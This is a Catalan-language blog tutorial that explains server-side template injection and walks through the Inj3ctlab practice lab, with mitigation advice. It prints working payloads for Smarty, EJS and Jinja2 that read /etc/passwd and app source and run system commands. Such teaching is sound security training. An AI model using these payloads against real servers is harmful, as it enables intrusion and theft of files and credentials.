---
author: Lenam
pubDatetime: 2025-02-01T15:22:00Z
title: Lab Inj3ctlab - Bug Bounty Labs
slug: inj3ctlab-lab-bugbountylabs-ca
featured: false
draft: false
ogImage: "../../../assets/images/inj3ctlab/OpenGraph.png"
tags:
  - lab
  - Bug Bounty Labs
  - SSTI
  - nodejs
  - PHP
  - python
description:
   Article que descriu la vulnerabilitat SSTI i mostra, pas a pas, com resoldre el laboratori Inj3ctlab de Bug Bounty Labs per practicar SSTI en múltiples motors de plantilles.
lang: ca
---

![Alt text](../../../assets/images/inj3ctlab/OpenGraph.png)

Article que descriu la vulnerabilitat SSTI i mostra, pas a pas, com resoldre el laboratori Inj3ctlab de Bug Bounty Labs per practicar SSTI en múltiples motors de plantilles.

## Taula de contingut

## Què és SSTI?

La **Server-Side Template Injection (SSTI)** és una tècnica que permet a un atacant injectar i executar codi en el servidor a través d'un motor de plantilles. Això passa quan l'aplicació barreja entrades d'usuari amb les plantilles del costat del servidor sense realitzar un control o sanitització adequats. A continuació es descriu com ocorre i quines implicacions té:

1. **Context de la vulnerabilitat**  
   - En molts entorns de desenvolupament s'utilitzen motors de plantilles (per exemple, Jinja2 en Python, Twig en PHP, Freemarker en Java o EJS en Node.js) per generar contingut HTML en el servidor.  
   - Aquests motors ofereixen la possibilitat d'usar expressions o lògica bàsica (càlculs, bucles, etc.) per processar dades i generar la resposta final.

2. **Causes de la injecció**  
   - La SSTI ocorre quan una aplicació web insereix directament una cadena proporcionada per l'usuari dins de la plantilla.  
   - Si el motor de plantilles avalua aquesta cadena com a codi, es pot executar lògica arbitrària en el servidor.  
   - Un exemple mínim en Jinja2 seria passar `{{ 7*7 }}` a la plantilla i observar si el resultat retornat és `49`. Això demostra que el servidor està processant activament les expressions.

3. **Fases d'explotació**  
   1. **Detecció**: L'atacant introdueix una sintaxi específica segons el motor de plantilles per comprovar si la cadena és avaluada.  
   2. **Escalat**: Si la injecció funciona (per exemple, retorna un resultat numèric o exposa objectes interns), l'atacant intenta descobrir quines funcionalitats són accessibles (variables, funcions, mòduls) dins de l'entorn d'execució.  
   3. **Execució de codi**: En motors de plantilles amb un abast elevat, és possible arribar a executar comandes del sistema operatiu o accedir a recursos interns, desembocant en una **execució remota de codi (RCE)**.

4. **Impacte en la seguretat**  
   - Compromís total de l'aplicació i del servidor, en el cas que el motor permeti l'execució de codi arbitrari.  
   - Accés a dades sensibles, com informació de configuració, credencials o variables d'entorn.  
   - Possibilitat de pivotar cap a altres sistemes connectats, si el servidor vulnerable té privilegis elevats o accés a xarxes internes.

5. **Recomanacions de mitigació**  
   - **Escapar i validar l'entrada**: Assegurar-se que cap cadena d'usuari es processi com a part de la sintaxi de la plantilla.  
   - **Configurar el motor de plantilles**: Deshabilitar o restringir les funcionalitats que permetin avaluació de codi arbitrari o accés a objectes interns.  
   - **Lògica del costat del servidor**: Separar les parts lògiques de l'aplicació del contingut que prové dels usuaris, evitant l'ús d'eval o construccions similars.  
   - **Actualitzacions i pedaços**: Mantenir els motors de plantilles i la resta de la infraestructura al dia amb les últimes correccions de seguretat.  
   - **Revisions de seguretat**: Realitzar proves específiques (fuzzing, pentesting) per detectar si l'aplicació és vulnerable a SSTI.  
 
### Referències SSTI

[Server-Side Template Injection: RCE for the Modern Web App](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf): Aquesta investigació aprofundeix en com les vulnerabilitats SSTI poden portar a l'execució remota de codi en aplicacions web modernes, analitzant diferents motors de plantilles i proporcionant exemples detallats.
   
[A Pentester's Guide to Server-Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti): Aquesta guia exhaustiva per a professionals de proves de penetració explora les tècniques de detecció i explotació de SSTI, així com les millors pràctiques per a la seva mitigació.

### Referències a pàgines de motors de plantilles

A continuació et proporciono un llistat de motors de plantilles organitzats per tecnologies, juntament amb enllaços a les seves referències oficials:

**JavaScript:**

- **Handlebars.js:** Un motor de plantilles simple però potent que permet la creació de plantilles semàntiques. [Lloc oficial](https://handlebarsjs.com/)
- **Mustache.js:** Un motor de plantilles lògic que funciona en diverses plataformes. [Lloc oficial](https://mustache.github.io/)
- **EJS (Embedded JavaScript):** Permet generar HTML amb JavaScript simple. [Lloc oficial](https://ejs.co/)
  
**Python:**

- **Jinja2:** Un motor de plantilles modern per a Python, utilitzat freqüentment amb el framework Flask. [Lloc oficial](https://jinja.palletsprojects.com/)
- **Django Templates:** El sistema de plantilles integrat en el framework Django. [Documentació oficial](https://docs.djangoproject.com/en/stable/topics/templates/)
  
**Ruby:**

- **ERB (Embedded Ruby):** El sistema de plantilles predeterminat en Ruby on Rails. [Documentació oficial](https://ruby-doc.org/stdlib/libdoc/erb/rdoc/ERB.html)
- **Haml:** Un motor de plantilles que busca simplificar la sintaxi HTML. [Lloc oficial](http://haml.info/)
  
**PHP:**

- **Twig:** Un motor de plantilles flexible, segur i ràpid per a PHP. [Lloc oficial](https://twig.symfony.com/)
- **Blade:** El motor de plantilles simple però potent que ve amb Laravel. [Documentació oficial](https://laravel.com/docs/stable/blade)
  
**Java:**

- **Thymeleaf:** Un motor de plantilles per a Java orientat a la web i entorns standalone. [Lloc oficial](https://www.thymeleaf.org/)
- **FreeMarker:** Un motor de plantilles basat en Java per a la generació de text de sortida com HTML. [Lloc oficial](https://freemarker.apache.org/)
  
**C#:**

- **Razor:** El motor de plantilles utilitzat en ASP.NET per generar contingut dinàmic en la web. [Documentació oficial](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/razor)
  
**Go:**

- **Go Templates:** El paquet de plantilles natiu de Go per generar contingut dinàmic. [Documentació oficial](https://pkg.go.dev/text/template)

Espero que aquest llistat et sigui d'utilitat.

## Laboratori Inj3ctlab de Bug Bounty Labs

**Inj3ctlab** és un laboratori concebut per **practicar i perfeccionar** tècniques de Server-Side Template Injection en diferents entorns. Desenvolupat per **Bug Bounty Labs**, ofereix diversos serveis en diferents ports per simular situacions reals. A través d'escenaris concrets, els usuaris poden:

- Identificar vectors de SSTI en 3 tecnologies (PHP, NodeJs i Python).  
- Aprendre a escalar la injecció des de simples proves aritmètiques fins a RCE (Remote Code Execution).  

El laboratori proporciona un enfocament pràctic i controlat, ideal per experimentar amb diferents configuracions i assegurar que els participants adquireixin experiència realista en la detecció de vulnerabilitats SSTI.

Aixequem el laboratori seguint les instruccions de [Bug Bounty Labs](https://bugbountylabs.com).

![alt text](../../../assets/images/inj3ctlab/image.png)

Obtenim l'adreça IP del laboratori `127.17.0.2`.

### Enumeració

```bash
$ nmap -p- 172.17.0.2 -oN all_ports                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 21:22 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
5000/tcp open  upnp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds

```

```bash
nmap -p80,3000,5000 -sVC 172.17.0.2 -oN specific_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 21:22 CET
Nmap scan report for 172.17.0.2
Host is up (0.000029s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: PHP App
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.9.2
|     Date: Sun, 02 Feb 2025 20:22:38 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 60524
|     Connection: close
|     <h1>Python App</h1>
|     <img src="data:image/png;base64, 

...
...

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.06 seconds
```

Observem que els tres ports `80`, `3000` i `5000` tenen serveis web, els obrim en el navegador.

Trobem tres serveis, amb el logotip de la tecnologia que està corrent en el backend i un camp de formulari on podem introduir el nostre nom.

![alt text](../../../assets/images/inj3ctlab/image-1.png)

### Detectar SSTI

Intentem detectar SSTI en els tres ports i en trobem un per a cada tecnologia.

| Tecnologia  | Port | Payload enviat    | Resultat  |
|:-----------:|------|-------------------|-----------|
| PHP         |  80  | `{7*7}`           | Hola, 49! |
| Node.js     | 3000 | `<%=7*7%>`        | Hola, 49! |
| Python      | 5000 | `{{7*7}}`         | Hola, 49! |

### Detectar motor de plantilla que corre darrere

Cada tecnologia de backend (PHP, Node.js, Python, Java, ...) pot tenir diferents motors de plantilles (Smarty, EJS, ...). Normalment, alguns motors són més habituals en certes tecnologies, però creieu-me, hi ha invents estranys que permeten utilitzar motors dissenyats per a PHP en Node.js (https://github.com/ecomfe/smarty4js), etc.

A més de les tècniques explicades en les referències anteriors, també podem intentar comprendre millor com funciona cada motor de plantilles i utilitzar possibles variables que només apareguin en cadascun d’ells.

Exemple:

| Tecnologia  | Port | Payload enviat                | Resultat esperat                                    |
|:-----------:|------|-------------------------------|-----------------------------------------------------|
| PHP         |  80  | `{$smarty.version}`          | Versió del motor de plantilla **Smarty**           |
| Node.js     | 3000 | `<%=JSON.stringify(locals)%>` | Totes les variables incloses en la plantilla **EJS** |
| Python      | 5000 | `{{config}}`                  | Configuració de **Flask**                          |

Aquests són només alguns exemples. La clau és conèixer una mica cada motor de plantilles per poder identificar-los.

### Aconseguir LFI (Local File Inclusion) i RCE (Remote Code Execution)

Ara ja sabem les tecnologies que estan corrent en el backend i també els payloads que ens permeten executar PHP, Node.js i Python a través de la injecció en la plantilla.

Precisament les funcions, llibreries i mòduls d’aquestes tecnologies són les que utilitzarem per aconseguir un LFI i RCE.

#### Taula d'exemples LFI

| Tecnologia  | Port | Payload enviat                                                                                                  | Resultat                      |
|:-----------:|------|----------------------------------------------------------------------------------------------------------------|--------------------------------|
| PHP         |  80  | `{file_get_contents("/etc/passwd")}`                                                                           | Fitxer passwd                 |
| Node.js     | 3000 | `<%- include("/app/node-app/app.js")%>`                                                                        | Codi font de l'aplicació       |
| Python      | 5000 | `{{'X'.__class__.__base__.__subclasses__()[101].__subclasses__()[0].__subclasses__()[0]('/etc/passwd').read()}}` | Fitxer passwd                 |

Com es pot observar en **PHP**, ha estat molt fàcil; en **Node.js**, amb EJS, només aconsegueixo obtenir fitxers amb extensions del sistema; i en **Python**, he seguit les instruccions d'**Ingo Kleiber** en el seu post [A Simple Flask (Jinja2) Server-Side Template Injection (SSTI) Example](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/).

#### Taula d'exemples RCE

| Tecnologia  | Port | Payload enviat                                                                            |
|:-----------:|------|-------------------------------------------------------------------------------------------|
| PHP         |  80  | `{exec("whoami")}`                                                                        |
| Node.js     | 3000 | ?                                                                                         |
| Python      | 5000 | `{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}` |

En PHP amb Smarty i Python amb Flask ha estat fàcil, però amb Node.js i EJS no ho he aconseguit.

A partir d’aquí, ja es podria crear una reverse-shell o qualsevol altra cosa que volguéssim executar en el servidor.

Espero que aquest laboratori i article serveixin perquè algú aprengui alguna cosa sobre SSTI i les tecnologies de plantilles.


